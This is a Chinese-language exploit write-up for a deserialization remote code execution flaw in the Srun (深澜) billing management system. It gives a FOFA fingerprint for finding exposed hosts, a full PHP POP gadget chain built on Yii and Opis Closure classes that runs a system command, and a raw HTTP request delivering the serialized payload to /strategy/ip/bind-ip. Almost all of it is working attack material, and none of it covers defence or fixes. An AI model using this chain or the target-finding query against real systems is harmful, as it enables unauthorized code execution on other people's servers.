## 深澜计费管理系统strategy存在反序列化RCE漏洞

## fofa

```
"/js/lib/slimscroll.js"
```

## 构造POP反序列化链子

```php

<?php
namespace yii\base {
	class Component {
		private $_events = array();
		private $_behaviors = 1;
		public function __construct() {
			include("./vendor/opis/closure/autoload.php");
			$func = function() {
				$cmd = 'touch /tmp/hacker';
				system($cmd);
			}
			;
			$raw = \Opis\Closure\serialize($func);
			$data=\Opis\Closure\unserialize($raw);
			$this->_events = ["afterOpen" => [[
			 $data,
			 "huahua"
			 ]]];
		}
	}
}
namespace yii\redis {
	use yii\base\Component;
	class Connection extends Component {
		public $redisCommands = [];
		public $hostname = '';
		public $port;
		public $password;
		public $username;
		public $connectionTimeout;
		public $dataTimeout;
		public $database;
		public $unixSocket;
		private $_socket;
		public function __construct() {
			$this->redisCommands = array('CLEAN UP');
			$this->_socket = false;
			$this->hostname = '127.0.0.1';
			$this->port = 8001;
			//能够连通的任意本地服务的端⼝
			$this->unixSocket = false;
			$this->connectionTimeout = 5;
			parent::__construct();
		}
	}
}
namespace setasign\Fpdi\PdfReader {
	use yii\redis\Connection;
	class PdfReader {
		protected $parser;
		public function __construct() {
			$this->parser = new Connection;
		}
	}
	include("./vendor/opis/closure/autoload.php");
	echo urlencode(\Opis\Closure\serialize(new PdfReader));
}
?>
```

```
POST /strategy/ip/bind-ip HTTP/2
Host: 192.168.10.101:8080
Cookie: lang=zh-CN; PHPSESSID_8080=f434cd5f5e9befe38ab3d688b49eacb5; _csrf-8080=515a2ce1d579e3eb33de0fb00d2eddb40cbfb5db938eb248ddaa2069ed9ba803a%3A2%3A%7Bi%3A0%3Bs%3A10%3A%22_csrf-8080%22%3Bi%3A1%3Bs%3A32%3A%22zKeB2l7C4-gTmKM4dulmKqnWGCnlHFDP%22%3B%7D
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Content-Length: 1265

data1=O%3A33%3A%22setasign%5CFpdi%5CPdfReader%5CPdfReader%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00parser%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A12%3A%7B
```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407072009192.png)

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407072010868.png)